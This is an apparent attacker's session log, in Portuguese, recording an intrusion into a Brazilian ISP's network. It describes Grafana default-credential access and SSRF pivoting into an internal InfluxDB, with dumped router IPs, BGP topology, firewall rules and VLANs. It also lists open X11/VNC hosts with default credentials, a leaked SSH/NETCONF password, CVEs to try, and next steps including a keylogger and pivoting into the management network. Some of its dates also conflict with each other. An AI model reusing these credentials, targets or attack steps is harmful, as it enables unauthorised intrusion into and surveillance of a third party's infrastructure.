# IR-KALINE Session 20 - InfluxDB Intelligence Dump

**Data:** 27-11-2024 ~13:58 BRT
**Status:** Inteligência Massiva Extraída via Grafana SSRF
**Fonte:** InfluxDB `jtsdb` (Junos Telemetry Service)

---

## ACESSO OBTIDO

### Grafana ADMIN
```
URL: http://177.54.224.1:8080
User: admin
Pass: admin
SSRF: Datasources criados para pivô interno
```

### InfluxDB Interno (via SSRF)
```
Datasource ID: 4 (InternalInflux)
URL: http://influxdb:8086
Database: jtsdb
Series: 2,856,683 (2.8 MILHÕES!)
Measurements: 12
Uptime: 47+ dias
```

---

## INVENTÁRIO DE DISPOSITIVOS JUNIPER

### Edge Routers Confirmados
| Hostname | IP | Modelo | Versão |
|----------|-----|--------|--------|
| edge1.aux1 | 177.54.235.2 | MX304 | 23.4R2-S2.1 |
| edge1.aux2 | 177.54.235.3 | MX204 | 23.4R2-S2.1 |
| edge1.imp1 | 177.54.235.6 | MX204 | 23.4R2-S2.1 |
| edge1.mab1 | TBD | MX* | 23.4R2-S2.1 |
| edge1.pup1 | TBD | MX* | 23.4R2-S2.1 |

### BNG (Broadband Network Gateway)
| Hostname | IP | Modelo | Versão |
|----------|-----|--------|--------|
| bng1.aux1 | TBD | MX* | 21.4R* |
| bng1.aux2 | TBD | MX* | 21.4R* |

### Device IPs Conhecidos
```
177.54.235.1
177.54.235.2 (edge1.aux1)
177.54.235.3 (edge1.aux2)
177.54.235.4
177.54.235.5
177.54.235.6 (edge1.imp1)
177.54.235.23
```

---

## TOPOLOGIA BGP

### IX.br Connections
- IXBR-CE (Fortaleza) - IPv4/IPv6
- IXBR-DF (Brasília) - IPv4/IPv6
- IXBR-SP (São Paulo) - IPv4/IPv6
- IXBR-TO (Tocantins) - IPv4/IPv6

### BGP Peer Groups
```
CLIENTE-DEFAULT-IPV4/IPV6 - Clientes downstream
CLIENTE-FULL-IPV4/IPV6 - Clientes full table
CLIENTES-CDN-V4/V6 - CDN customers
IBGP-V4/V6 - Internal BGP
IBGP-RR-CLIENTES-V4/V6 - Route Reflector
IBGP-KENTIK-V4/V6 - Kentik monitoring
PEERING-V4/V6 - Direct peering
PNI-IPV4/IPV6 - Private Network Interconnect
WAN-IPV4/IPV6 - Upstream links
```

### BGP Peers Internos (100+ IPs)
```
Rede de Gerência: 100.100.224.0/24, 100.101.224.0/24
Rede Interna: 10.231.0.0/24, 10.250.2.0/24
```

---

## INFRAESTRUTURA FÍSICA

### Backbone Switches
- Huawei S12700 (100GE)
- SW01_NOR1_AUX - Noreste 1
- SW02_CRISTO_AUX - Cristo
- SW01_IMPERATRIZ - Imperatriz/MA

### WAN Upstreams
- WAN_EMBRATEL - Embratel
- WAN_IP_ELETRONET - Eletronet

### PPPoE
- PPPOEMAIN - Principal
- PPPOEBACKUP - Backup

---

## FIREWALL RULES EXPOSTAS

```
accept-bgp-lo0.0-inet-i
accept-dns-lo0.0-inet-i
accept-established-tcp-*
__default_arp_policer__
__flowspec_default_inet__
Policers por velocidade (100m, 1G, 1.5G, 10G)
```

### VLANs Expostas
```
199, 205, 544, 829, 873, 886, 887, 889, 914, 925
941, 943, 944, 946, 947, 950, etc.
```

---

## EVENTOS JUNOS CAPTURADOS

### Comando Root Capturado
```
root@re1 as root: cmd='ls -i /var/etc/filters/filter-define.conf'
Timestamp: 2025-11-26T16:47:54
Device: 177.54.235.2 (edge1.aux1)
```

---

## SSRF DATASOURCES CRIADOS

| ID | Nome | URL | Status |
|----|------|-----|--------|
| 1 | JTSDatabase | http://influxdb:8086 | FUNCIONA |
| 2 | SSRF-TESTING | http://169.254.169.254/latest/meta-data | PENDENTE |
| 3 | InternalSSRF | http://177.54.235.252:22 | PENDENTE |
| 4 | InternalInflux | http://influxdb:8086 | FUNCIONA |
| 5 | LocalhostSSRF | http://localhost:8080 | PENDENTE |
| 6 | Docker | http://172.17.0.1:2375 | SEM RESPOSTA |
| 7 | JTS-Internal | http://jts:8080 | PENDENTE |

---

## X11 ABERTO (ECI NMS)

```
IP: 177.54.235.252
Portas Abertas: 6001, 6002, 6003
Security: None
VNC: 5900, 5901, 5902 (No Auth)
App: ECI ShadeTree Management Suite
Default Creds: admin:admin, admin:eci
```

---

## CVEs RELEVANTES

### Junos 23.4R2-S2.1 (Atual)
- CVE-2024-21591: J-Web RCE (PATCHEADO)
- CVE-2025-21590: Local RCE (precisa shell)
- CVE-2025-21601: DoS via HTTP

### Junos 21.4R3-S6/S7 (BNG)
- CVE-2024-21591: J-Web RCE (VULNERÁVEL se J-Web ativo)

---

## PRÓXIMOS VETORES (SESSÃO 21)

1. [ ] VNC manual no ECI com creds admin:admin
2. [ ] X11 screenshot/keylogger se ferramentas instaladas
3. [ ] SSRF para rede de gerência 100.100.224.x
4. [ ] Tentar J-Web nos BNGs (versão 21.4 vulnerável)
5. [ ] SSH/NETCONF com creds openjts:dh273816

---

**Última atualização:** 27-11-2024 13:58 BRT
